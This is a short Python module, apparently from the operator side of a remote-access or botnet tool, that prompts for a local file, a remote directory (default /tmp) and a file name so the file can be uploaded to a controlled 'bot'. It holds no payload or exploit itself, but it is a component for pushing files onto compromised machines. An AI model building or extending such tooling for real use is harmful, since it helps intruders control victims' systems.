# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *
import os


class Module(ModuleABC):
    def get_info(self) -> dict:
        return {
            "Author:": ["Marten4n6"],
            "Description": "Upload a file to the bot.",
            "References": [],
            "Stoppable": False
        }

    def setup(self, view) -> Tuple[bool, Optional[dict]]:
        local_file = os.path.expanduser(view.prompt("Path to the local file to upload: "))
        output_dir = view.prompt("Remote output directory [ENTER for /tmp]: ")
        output_name = view.prompt("New file name [ENTER to skip]: ")

        if not output_dir:
            output_dir = "/tmp"
        if not output_name:
            output_name = os.path.basename(local_file)

        if not os.path.exists(local_file):
            view.output("Failed to find local file: {}".format(local_file), "attention")
            return False, None
        else:
            return True, {
                "output_dir": output_dir,
                "output_name": output_name
            }
